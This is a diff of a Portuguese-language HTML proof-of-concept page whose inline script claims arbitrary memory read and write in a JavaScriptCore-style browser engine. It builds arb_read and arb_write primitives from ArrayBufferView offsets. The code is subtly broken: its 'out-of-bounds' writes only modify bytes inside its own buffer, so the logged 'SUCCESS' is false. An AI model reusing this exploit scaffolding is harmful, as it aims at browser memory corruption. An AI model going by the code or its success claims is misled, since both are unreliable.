@@ -1,31 +1,291 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>Teste Isolado - JSON Type Confusion</title>
+    <title>POC - Teste de Leitura/Escrita Arbitrária</title>
     <style>
-        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
-        #output-advanced { /* ID usado por logS3 */
-            background: #222;
-            border: 1px solid #444;
-            padding: 10px;
-            height: 75vh; 
-            overflow-y: auto;
-            white-space: pre-wrap;
-            margin-top: 10px;
-        }
-        /* Estilos básicos de log para melhor visualização */
-        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
-        .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; }
-        .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; }
+        body { font-family: monospace; background-color: #1e1e1e; color: #d4d4d4; padding: 20px; }
+        h1, h2 { color: #9cdcfe; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; border: 1px solid #9cdcfe; background-color: #252526; color: #d4d4d4; }
+        button:disabled { cursor: not-allowed; opacity: 0.5; }
+        #log-output { background-color: #252526; border: 1px solid #555; padding: 10px; margin-top: 20px; height: 500px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px; }
+        .log-test { color: #808080; }
+        .log-info { color: #9cdcfe; }
+        .log-good, .log-vuln { color: #4ec9b0; font-weight: bold; }
+        .log-leak { color: #b5cea8; }
+        .log-warn { color: #ffd700; }
+        .log-error, .log-critical { color: #f44747; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>Teste Isolado: JSON Type Confusion UAF Speculative</h1>
-    <p>Abra o console do desenvolvedor para verificar possíveis erros que não são capturados no log da página.</p>
-    <button id="runIsolatedTestBtn">Iniciar Teste Isolado</button>
-    <div id="output-advanced"></div>
+    <h1>Prova de Conceito (POC)</h1>
+    <p>Este teste demonstra a capacidade de <strong>leitura e escrita arbitrária na memória</strong>.</p>
+    <button id="run-button">Executar Teste</button>
+    <h2>Log de Saída:</h2>
+    <div id="log-output"></div>
 
-    <script type="module" src="js/run_isolated_test.mjs"></script>
+    <script type="module">
+        // =======================================================================================
+        // MÓDULO DE LOGGING (para exibir saída na tela)
+        // =======================================================================================
+        const logOutput = document.getElementById('log-output');
+        const logS3 = (message, type = 'info', context = '') => {
+            const timestamp = new Date().toLocaleTimeString();
+            const formattedContext = context ? `[${context}] ` : '';
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-${type}`;
+            logEntry.textContent = `[${timestamp}] ${formattedContext}${message}`;
+            logOutput.appendChild(logEntry);
+            logOutput.scrollTop = logOutput.scrollHeight;
+        };
+        const log = logS3; // Alias para compatibilidade
+        const PAUSE_S3 = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+        // =======================================================================================
+        // CONTEÚDO DE: utils.mjs
+        // =======================================================================================
+        class AdvancedInt64 {
+            constructor(low, high) {
+                if (arguments.length === 1) {
+                    const v = arguments[0];
+                    if (typeof v === 'number') {
+                        this.low_ = v & 0xFFFFFFFF;
+                        this.high_ = Math.floor(v / 0x100000000);
+                    } else if (typeof v === 'string') {
+                        let a = v.toLowerCase();
+                        if (a.startsWith('0x')) a = a.substring(2);
+                        if (a.length > 16) throw new Error("String too long");
+                        while (a.length < 16) a = '0' + a;
+                        this.high_ = parseInt(a.substring(0, 8), 16);
+                        this.low_ = parseInt(a.substring(8, 16), 16);
+                    } else { throw new TypeError("Invalid argument"); }
+                } else {
+                    this.low_ = low; this.high_ = high;
+                }
+            }
+            low() { return this.low_; }
+            high() { return this.high_; }
+            equals(other) { return this.low_ === other.low_ && this.high_ === other.high_; }
+            toString(hex = false) {
+                if (!hex) return `[low: ${this.low_}, high: ${this.high_}]`;
+                const high_str = ('00000000' + this.high_.toString(16)).slice(-8);
+                const low_str = ('00000000' + this.low_.toString(16)).slice(-8);
+                return `0x${high_str}${low_str}`;
+            }
+        }
+        const isAdvancedInt64Object = (obj) => obj instanceof AdvancedInt64;
+        const toHex = (val, bits = 32) => '0x' + (val >>> 0).toString(16).padStart(bits / 4, '0');
+
+        // =======================================================================================
+        // CONTEÚDO DE: config.mjs
+        // =======================================================================================
+        const OOB_CONFIG = { ALLOCATION_SIZE: 0x100 };
+        const JSC_OFFSETS = { ArrayBufferView: { M_VECTOR_OFFSET: 0x10, M_LENGTH_OFFSET: 0x18, M_MODE_OFFSET: 0x1C } };
+
+        // =======================================================================================
+        // CONTEÚDO DE: core_exploit.mjs
+        // =======================================================================================
+        let oob_array_buffer_real = null;
+        let oob_dataview_real = null;
+        let isOOBEnvironmentSetup = false;
+        const toHexHelper = (val, bits = 32) => toHex(val, bits);
+        const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58;
+        const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
+        const OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
+        const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;
+
+        function clearOOBEnvironment() {
+            oob_array_buffer_real = null;
+            oob_dataview_real = null;
+            isOOBEnvironmentSetup = false;
+        }
+
+        async function triggerOOB_primitive(options = { force_reinit: false }) {
+            const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';
+            if (isOOBEnvironmentSetup && !options.force_reinit) return true;
+            clearOOBEnvironment();
+            try {
+                oob_array_buffer_real = new ArrayBuffer(OOB_CONFIG.ALLOCATION_SIZE);
+                oob_dataview_real = new DataView(oob_array_buffer_real, 0, OOB_CONFIG.ALLOCATION_SIZE);
+                if (OOB_CONFIG.ALLOCATION_SIZE > OOB_DV_M_LENGTH_OFFSET + 3) {
+                    oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, true);
+                    log(`m_length do oob_dataview_real expandido para 0xFFFFFFFF no offset ${toHexHelper(OOB_DV_M_LENGTH_OFFSET)}.`, 'info', FNAME_TRIGGER);
+                } else { throw new Error("Allocation size too small"); }
+                log(`Ambiente para Operações OOB CONFIGURADO com sucesso.`, 'good', FNAME_TRIGGER);
+                isOOBEnvironmentSetup = true;
+                return true;
+            } catch (e) {
+                log(`ERRO CRÍTICO em ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER);
+                clearOOBEnvironment(); throw e;
+            }
+        }
+
+        function oob_read_absolute(offset, byteLength) {
+            if (!isOOBEnvironmentSetup) throw new Error("OOB Env not initialized.");
+            switch (byteLength) {
+                case 1: return oob_dataview_real.getUint8(offset);
+                case 2: return oob_dataview_real.getUint16(offset, true);
+                case 4: return oob_dataview_real.getUint32(offset, true);
+                case 8: return new AdvancedInt64(oob_dataview_real.getUint32(offset, true), oob_dataview_real.getUint32(offset + 4, true));
+                default: throw new Error(`Invalid byteLength: ${byteLength}`);
+            }
+        }
+
+        function oob_write_absolute(offset, value, byteLength) {
+            if (!isOOBEnvironmentSetup) throw new Error("OOB Env not initialized.");
+            switch (byteLength) {
+                case 1: oob_dataview_real.setUint8(offset, Number(value)); break;
+                case 2: oob_dataview_real.setUint16(offset, Number(value), true); break;
+                case 4: oob_dataview_real.setUint32(offset, Number(value), true); break;
+                case 8:
+                    let val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
+                    oob_dataview_real.setUint32(offset, val64.low(), true);
+                    oob_dataview_real.setUint32(offset + 4, val64.high(), true);
+                    break;
+                default: throw new Error(`Invalid byteLength: ${byteLength}`);
+            }
+        }
+
+        function isOOBReady() {
+            if (!isOOBEnvironmentSetup || !oob_dataview_real) return false;
+            try { return oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true) === 0xFFFFFFFF; }
+            catch (e) { return false; }
+        }
+
+        function arb_read(absolute_address, byteLength) {
+            const FNAME = 'CoreExploit.arb_read';
+            if (!isOOBReady()) throw new Error("OOB not ready for arb_read.");
+            let addr64 = isAdvancedInt64Object(absolute_address) ? absolute_address : new AdvancedInt64(absolute_address);
+            let m_vector_orig_snap, m_length_orig_snap, m_mode_orig_snap;
+            try {
+                m_vector_orig_snap = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
+                m_length_orig_snap = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4);
+                m_mode_orig_snap = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);
+                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8);
+                oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
+                switch (byteLength) {
+                    case 1: return oob_dataview_real.getUint8(0);
+                    case 2: return oob_dataview_real.getUint16(0, true);
+                    case 4: return oob_dataview_real.getUint32(0, true);
+                    case 8: return new AdvancedInt64(oob_dataview_real.getUint32(0, true), oob_dataview_real.getUint32(4, true));
+                    default: throw new Error(`Invalid byteLength for arb_read: ${byteLength}`);
+                }
+            } finally {
+                if (m_vector_orig_snap) {
+                    oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
+                    oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, m_length_orig_snap, 4);
+                    oob_write_absolute(OOB_DV_M_MODE_OFFSET, m_mode_orig_snap, 4);
+                }
+            }
+        }
+        function arb_write(absolute_address, value, byteLength) {
+             const FNAME = 'CoreExploit.arb_write';
+            if (!isOOBReady()) throw new Error("OOB not ready for arb_write.");
+            let addr64 = isAdvancedInt64Object(absolute_address) ? absolute_address : new AdvancedInt64(absolute_address);
+            let m_vector_orig_snap, m_length_orig_snap, m_mode_orig_snap;
+             try {
+                m_vector_orig_snap = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
+                m_length_orig_snap = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4);
+                m_mode_orig_snap = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);
+                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8);
+                oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
+                 switch (byteLength) {
+                    case 1: oob_dataview_real.setUint8(0, Number(value)); break;
+                    case 2: oob_dataview_real.setUint16(0, Number(value), true); break;
+                    case 4: oob_dataview_real.setUint32(0, Number(value), true); break;
+                    case 8:
+                        let val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
+                        oob_dataview_real.setUint32(0, val64.low(), true);
+                        oob_dataview_real.setUint32(4, val64.high(), true);
+                        break;
+                    default: throw new Error(`Invalid byteLength for arb_write: ${byteLength}`);
+                }
+            } finally {
+                 if (m_vector_orig_snap) {
+                    oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
+                    oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, m_length_orig_snap, 4);
+                    oob_write_absolute(OOB_DV_M_MODE_OFFSET, m_mode_orig_snap, 4);
+                }
+            }
+        }
+        
+        // =======================================================================================
+        // CONTEÚDO DE: testArrayBufferVictimCrash.mjs
+        // =======================================================================================
+        const TEST_ABSOLUTE_ADDRESS = new AdvancedInt64(0x00000D00, 0x00000000); // 3328d
+        const VALUE_A = new AdvancedInt64(0xAAAAAAAA, 0x11111111);
+        const VALUE_B = new AdvancedInt64(0xBBBBBBBB, 0x22222222);
+        const VALUE_C_32BIT = 0xCAFEBABE;
+
+        async function executeArrayBufferVictimCrashTest() {
+            const FNAME_CURRENT_TEST = "POC_Test";
+            logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Testando Primitivas arb_read/arb_write ---`, "test");
+            let exploit_result = { success: false, message: "Teste não iniciado." };
+            try {
+                await triggerOOB_primitive({ force_reinit: true });
+                if (!isOOBReady()) throw new Error("Ambiente OOB não pôde ser inicializado.");
+                logS3("PASSO 1: Ambiente OOB inicializado e pronto.", "info", FNAME_CURRENT_TEST);
+
+                logS3(`PASSO 2: Escrevendo VALOR_A (${VALUE_A.toString(true)}) no endereço ${TEST_ABSOLUTE_ADDRESS.toString(true)}...`, "info", FNAME_CURRENT_TEST);
+                arb_write(TEST_ABSOLUTE_ADDRESS, VALUE_A, 8);
+                const read_A_obj = arb_read(TEST_ABSOLUTE_ADDRESS, 8);
+                logS3(`  Valor lido de volta: ${read_A_obj.toString(true)}`, "leak", FNAME_CURRENT_TEST);
+                if (!read_A_obj.equals(VALUE_A)) throw new Error(`Falha no teste A: Lido ${read_A_obj.toString(true)}`);
+                logS3(`  SUCESSO: VALOR_A escrito e lido corretamente!`, "good", FNAME_CURRENT_TEST);
+
+                logS3(`PASSO 3: Escrevendo VALOR_B (${VALUE_B.toString(true)}) para sobrescrever...`, "info", FNAME_CURRENT_TEST);
+                arb_write(TEST_ABSOLUTE_ADDRESS, VALUE_B, 8);
+                const read_B_obj = arb_read(TEST_ABSOLUTE_ADDRESS, 8);
+                logS3(`  Valor lido de volta: ${read_B_obj.toString(true)}`, "leak", FNAME_CURRENT_TEST);
+                if (!read_B_obj.equals(VALUE_B)) throw new Error(`Falha no teste B: Lido ${read_B_obj.toString(true)}`);
+                logS3(`  SUCESSO: VALOR_B escrito e lido corretamente!`, "good", FNAME_CURRENT_TEST);
+
+                logS3(`PASSO 4: Escrevendo VALOR_C (${toHex(VALUE_C_32BIT)}) (32 bits)...`, "info", FNAME_CURRENT_TEST);
+                arb_write(TEST_ABSOLUTE_ADDRESS, VALUE_C_32BIT, 4);
+                const read_C_val = arb_read(TEST_ABSOLUTE_ADDRESS, 4);
+                logS3(`  Valor lido de volta: ${toHex(read_C_val)}`, "leak", FNAME_CURRENT_TEST);
+                if (read_C_val !== VALUE_C_32BIT) throw new Error(`Falha no teste C: Lido ${toHex(read_C_val)}`);
+                logS3(`  SUCESSO: VALOR_C (32 bits) escrito e lido corretamente!`, "good", FNAME_CURRENT_TEST);
+
+                exploit_result.success = true;
+                exploit_result.message = "SUCESSO! Primitivas arb_read/arb_write funcionaram para 64 e 32 bits.";
+            } catch (e) {
+                exploit_result.message = `Erro: ${e.message}`;
+                logS3(exploit_result.message, "critical", FNAME_CURRENT_TEST);
+            } finally {
+                clearOOBEnvironment();
+                logS3("--- Teste Concluído ---", "test", FNAME_CURRENT_TEST);
+            }
+            return { exploit_attempt_result: exploit_result };
+        }
+
+        // =======================================================================================
+        // ORQUESTRADOR PRINCIPAL DA PÁGINA
+        // =======================================================================================
+        const runButton = document.getElementById('run-button');
+        const main = async () => {
+            runButton.disabled = true;
+            logS3("==== Prova de Conceito Iniciada ====", "test");
+            try {
+                const result = await executeArrayBufferVictimCrashTest();
+                if (result?.exploit_attempt_result?.success) {
+                    logS3("==== RESULTADO: SUCESSO! ====", "vuln");
+                    logS3(result.exploit_attempt_result.message, "vuln");
+                } else {
+                    logS3("==== RESULTADO: FALHA! ====", "critical");
+                    logS3(result?.exploit_attempt_result?.message || "O teste falhou por um motivo desconhecido.", "critical");
+                }
+            } catch (e) {
+                logS3(`==== ERRO CATASTRÓFICO: ${e.message} ===`, "critical");
+            } finally {
+                logS3("==== Prova de Conceito Finalizada ====", "test");
+                runButton.disabled = false;
+            }
+        };
+
+        runButton.addEventListener('click', main);
+        logS3("POC pronta. Clique no botão 'Executar Teste'.");
+
+    </script>
 </body>
 </html>
